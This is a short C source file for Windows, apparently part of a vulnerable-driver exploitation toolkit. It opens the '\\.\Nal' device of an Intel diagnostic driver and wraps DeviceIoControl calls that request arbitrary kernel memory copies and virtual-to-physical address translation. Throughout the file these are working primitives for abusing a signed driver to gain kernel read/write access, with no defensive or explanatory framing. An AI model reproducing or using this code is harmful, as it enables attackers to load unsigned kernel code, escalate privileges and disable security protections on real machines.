#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "intel.h"

BOOL MemCpy(
	HANDLE hDriver,
	ULONG64 Destination,
	ULONG64 Source,
	ULONG64 Length
)
{
	MEMCPY_INFO MemCpyInfo;
	DWORD       ReturnBytes;

	MemCpyInfo.CaseNum = CASE_NUMBER_MEMCPY;
	MemCpyInfo.Src     = Source;
	MemCpyInfo.Dst     = Destination;
	MemCpyInfo.Len     = Length;

	return DeviceIoControl(
		hDriver, 
		IOCTL_TRIGGER_FUNCTION,
		&MemCpyInfo,
		sizeof(MEMCPY_INFO),
		NULL,
		0,
		&ReturnBytes,
		NULL
	);
};

BOOL GetPhys(
	HANDLE hDriver,
	ULONG64 VirtualAddress,
	ULONG64 *lpPhysicalAddress
)
{
	GET_PHYS_INFO GetPhysicalAddr;
	DWORD         ReturnBytes;

	GetPhysicalAddr.CaseNum  = CASE_NUMBER_GET_PHYSICAL;
        GetPhysicalAddr.VirtAddr = VirtualAddress;
	
	if ( DeviceIoControl(
		hDriver,
		IOCTL_TRIGGER_FUNCTION,
		&GetPhysicalAddr,
		sizeof(GET_PHYS_INFO),
		NULL,
		0,
		&ReturnBytes,
		NULL
	     ) 
        ) { 
	  *lpPhysicalAddress = GetPhysicalAddr.PhysAddr;
	  return TRUE;
	};
	return FALSE;
};

HANDLE GetHandle()
{
	return CreateFileA(
		"\\\\.\\Nal",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
};
